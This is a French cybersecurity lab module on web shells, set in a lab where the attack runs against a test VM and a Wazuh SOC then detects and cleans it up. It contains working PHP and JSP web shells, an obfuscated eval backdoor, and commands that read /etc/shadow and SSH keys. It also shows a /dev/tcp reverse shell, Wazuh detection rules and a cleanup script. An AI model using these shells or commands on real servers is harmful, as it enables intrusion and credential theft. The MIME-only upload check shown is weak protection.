# 06 – Web Shells & Accès Persistant
**Durée estimée** : 1h30 | **Niveau** : Intermédiaire-avancé | **Prérequis** : 05_escalade_privileges.md

---

## 🎯 Objectif

Implémenter des **Web Shells** (backdoors web) pour obtenir un accès persistant et difficile à détecter.

Un web shell est un script web qui permet d'exécuter des commandes système à distance via le serveur HTTP.

**Compétences validées** :
- Exploitation de vulnérabilités upload
- Persistence post-exploitation
- Détection comportementale avancée

---

## 📋 Concepts clés

### Qu'est-ce qu'un Web Shell ?

Un web shell est un fichier (`.php`, `.jsp`, `.aspx`) uploadé sur le serveur qui fournit une interface Web pour exécuter des commandes système.

```
┌─────────────────┐
│   Attaquant     │
│  (Kali / Local) │
└────────┬────────┘
         │ HTTP GET/POST
         ▼
   ┌─────────────┐
   │ Web Server  │
   │  (Nginx)    │
   └────┬────────┘
        │
        ▼
  ┌──────────────┐
  │  shell.php   │  ← Web Shell
  │  exec($_GET) │  ← Exécute commandes
  └──────────────┘
```

**Avantages pour l'attaquant** :
- Accès rapide sans SSH
- Difficile à détecter (HTTP normal)
- Persistence même après perte d'accès SSH
- Flexibilité (exécution commands directe)

**Problèmes détection** :
- Logs HTTP de grande taille
- Patterns de commande difficiles à détecter
- Encoded payloads

---

## 🔧 Étape 1 – Créer des Web Shells

### 1.1 – Web Shell PHP simple

Sur la **machine attaquante (Kali)**, créer un fichier `shell.php` :

```bash
cat > shell.php << 'EOF'
<?php
// Simple Web Shell
if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>
EOF
```

**Vérification** :
```bash
cat shell.php
```

### 1.2 – Web Shell PHP obfusqué (discrétion)

Pour éviter la détection simple par grep, créer une version encodée :

```bash
cat > shell_encoded.php << 'EOF'
<?php
// Obfuscation basique
@eval(base64_decode($_REQUEST['e']));
?>
EOF
```

**Utilisation** : L'attaquant encode la commande en base64 avant envoi.

### 1.3 – Web Shell JSP (Java)

Si Tomcat/JBoss est présent :

```bash
cat > shell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
%>
EOF
```

---

## 📤 Étape 2 – Upload du Web Shell

### Scénario : Vulnérabilité d'upload

On suppose que VM1 a une **vulnérabilité d'upload** sans validation (par ex. formulaire d'upload de fichiers).

### 2.1 – Upload via formulaire (si disponible)

**Repérer le formulaire** :

```bash
curl -s http://192.168.1.10/upload.html | grep -i "form\|input"
```

**Upload direct** (si pas de validation MIME) :

```bash
curl -F "file=@shell.php" http://192.168.1.10/upload.php
```

### 2.2 – Upload via vulnérabilité connue (Exemple RCE)

Si une vulnérabilité existe dans un CMS (WordPress, Joomla, etc.) :

```bash
# Exemple : Exploit CVE-XXXX
python3 exploit.py --target http://192.168.1.10 --payload shell.php
```

### 2.3 – Vérifier l'upload

Une fois uploadé, localiser le fichier :

```bash
# Test simple
curl "http://192.168.1.10/uploads/shell.php?cmd=id"
```

**Output attendu** :
```
uid=48(apache) gid=48(apache) groups=48(apache)
```

---

## 🎭 Étape 3 – Exécuter des commandes via Web Shell

### 3.1 – Commandes simples

```bash
# Afficher le hostname
curl "http://192.168.1.10/uploads/shell.php?cmd=hostname"

# Voir les utilisateurs
curl "http://192.168.1.10/uploads/shell.php?cmd=cat%20/etc/passwd"

# Vérifier les permissions
curl "http://192.168.1.10/uploads/shell.php?cmd=whoami"
```

### 3.2 – Reconnaissance depuis le shell

```bash
# Lister répertoire home
curl "http://192.168.1.10/uploads/shell.php?cmd=ls%20-la%20/home"

# Voir les services actifs
curl "http://192.168.1.10/uploads/shell.php?cmd=ss%20-tuln"

# Vérifier sudo
curl "http://192.168.1.10/uploads/shell.php?cmd=sudo%20-l"
```

### 3.3 – Exfiltration de données

```bash
# Récupérer /etc/shadow (si apache a sudo)
curl "http://192.168.1.10/uploads/shell.php?cmd=sudo%20cat%20/etc/shadow"

# Récupérer clés SSH
curl "http://192.168.1.10/uploads/shell.php?cmd=cat%20/home/admin/.ssh/id_rsa"
```

### 3.4 – Reverse Shell depuis le Web Shell

Créer une backdoor interactive :

```bash
# Depuis shell.php, exécuter :
# bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

curl "http://192.168.1.10/uploads/shell.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/192.168.1.5/4444%200%3E%261"

# Sur Kali, écouter :
nc -lvnp 4444
```

---

## 🔍 Étape 4 – Vérifier la détection Wazuh

### 4.1 – Logs HTTP générés

Sur **VM1 (Serveur)**, vérifier les logs Nginx :

```bash
tail -50 /var/log/nginx/access.log | grep "shell"
```

**Output attendu** :
```
192.168.1.5 - - [10/Feb/2026:14:32:10 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 142 "-" "curl/7.x.x"
192.168.1.5 - - [10/Feb/2026:14:32:25 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 150 "-" "curl/7.x.x"
```

### 4.2 – Alertes Wazuh attendues

Sur **VM2 (SOC/Wazuh)**, consulter les alertes :

**Via CLI** :
```bash
# Récupérer les alertes liées au web shell
grep -r "shell\|exec\|cmd=" /var/ossec/logs/alerts/ | tail -20
```

**Via Web UI Wazuh** (`https://VM2_IP:443`) :
- Aller dans **Threat Detection** → **Events**
- Filtrer par :
  - `rule.description: "Web shell"` 
  - `data.http.request_uri: "shell"` 
  - Patterns : `exec`, `system`, `passthru`

### 4.3 – Règles Wazuh à vérifier

Vérifier que ces règles sont actives dans `/var/ossec/etc/rules/` :

```bash
grep -l "shell\|Web Shell" /var/ossec/etc/rules/*.xml
```

**Exemple de règle** (peut être créée) :

```xml
<rule id="100101" level="8">
    <if_sid>31101</if_sid>
    <regex>shell.php|shell.jsp|cmd=</regex>
    <description>Possible Web Shell detected in HTTP request</description>
</rule>
```

### 4.4 – Ajouter la règle personnalisée

```bash
# Sur VM2, éditer le fichier de règles
sudo nano /var/ossec/etc/rules/local_rules.xml
```

Ajouter :
```xml
<!-- Web Shell Detection -->
<rule id="200101" level="9">
    <if_sid>31101</if_sid>
    <field name="http.uri">shell</field>
    <description>Web Shell Access Detected</description>
    <group>web_shell_attack</group>
</rule>

<rule id="200102" level="8">
    <if_sid>31101</if_sid>
    <regex>cmd=|exec\(|system\(|passthru\(</regex>
    <description>Suspicious command execution in HTTP request</description>
    <group>web_shell_attack</group>
</rule>
```

Redémarrer Wazuh :
```bash
sudo systemctl restart wazuh-manager
```

---

## 🛡️ Étape 5 – Réaction (Incident Response)

### 5.1 – Localiser les fichiers suspects

**Script de recherche** :

```bash
#!/bin/bash
# find_shells.sh - Chercher les web shells potentiels

echo "[*] Searching for suspicious PHP files..."
find /var/www -name "*.php" -type f -exec grep -l "system\|exec\|passthru\|\$_REQUEST\|\$_GET" {} \;

echo "[*] Searching for suspicious JSP files..."
find /var/www -name "*.jsp" -type f -exec grep -l "Runtime.getRuntime\|Process" {} \;

echo "[*] Checking upload directories..."
ls -la /var/www/uploads/ 2>/dev/null | grep -v "^d" | grep -v "^total"

echo "[*] Checking recent modifications (last 24h)..."
find /var/www -type f -mtime -1 -name "*.php" -o -name "*.jsp" 2>/dev/null
```

**Lancer** :
```bash
chmod +x find_shells.sh
./find_shells.sh
```

### 5.2 – Supprimer les shells détectés

```bash
# Identifier le fichier suspect
ls -la /var/www/uploads/shell.php

# Sauvegarder pour analyse
sudo cp /var/www/uploads/shell.php /tmp/evidence_shell.php

# Supprimer
sudo rm /var/www/uploads/shell.php

# Vérifier
curl "http://192.168.1.10/uploads/shell.php?cmd=id"
# → Devrait retourner 404
```

### 5.3 – Renforcer les uploads

**Vérification MIME type** (`upload_handler.php`) :

```php
<?php
$allowed_types = ['image/jpeg', 'image/png', 'application/pdf'];
$file_type = $_FILES['file']['type'];

if (!in_array($file_type, $allowed_types)) {
    die('File type not allowed');
}

// Renommer avec extension immuable
$filename = uniqid() . '.jpg';
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
?>
```

### 5.4 – Audit des logs

```bash
# Voir toutes les requêtes vers shell.php
grep "shell" /var/log/nginx/access.log | wc -l

# Extraire les IPs attaquantes
grep "shell" /var/log/nginx/access.log | awk '{print $1}' | sort -u

# Timeline complète
grep "shell" /var/log/nginx/access.log | head -20
```

---

## ✅ Vérifications et tests

### Checklist d'exécution

- [ ] `shell.php` créé et testé en local
- [ ] `shell_encoded.php` créé
- [ ] `shell.jsp` créé (optionnel)
- [ ] Web shell uploadé sur VM1
- [ ] Web shell accessible via curl
- [ ] Commandes exécutées via web shell (`id`, `whoami`)
- [ ] Logs HTTP générés dans `/var/log/nginx/access.log`
- [ ] Alertes Wazuh générées et vérifiées
- [ ] Règles Wazuh personnalisées ajoutées
- [ ] Script `find_shells.sh` créé et testé
- [ ] Web shell supprimé avec succès
- [ ] Vérification 404 effectuée
- [ ] Audit complet des logs effectué

### Preuves à documenter

**Capture 1** : Upload et exécution web shell
```bash
curl "http://192.168.1.10/uploads/shell.php?cmd=id" -v
```

**Capture 2** : Logs Nginx
```bash
tail -20 /var/log/nginx/access.log
```

**Capture 3** : Alerte Wazuh
```
Screenshot de la Web UI Wazuh montrant l'alerte
```

**Capture 4** : Suppression et vérification 404
```bash
curl -i "http://192.168.1.10/uploads/shell.php?cmd=id"
```

---

## 📚 Ressources et références

- **OWASP Web Shell** : https://owasp.org/
- **PHP Security** : https://www.php.net/manual/en/security.php
- **Wazuh File Integrity Monitoring** : https://documentation.wazuh.com/current/user-manual/capabilities/file-integrity/index.html

---

## 🎓 Résumé des apprentissages

| Concept | Détail |
|---------|--------|
| **Web Shell** | Script web permettant exécution commande système |
| **Persistence** | Accès maintenu après compromission initiale |
| **Obfuscation** | Techniques pour échapper à la détection simple |
| **Detection** | Logs HTTP, patterns comportementaux, alertes |
| **Réaction** | Localisation, suppression, renforcement |

Ce module simule une attaque réaliste et teste la capacité du SOC à détecter et réagir à une menace persistante.
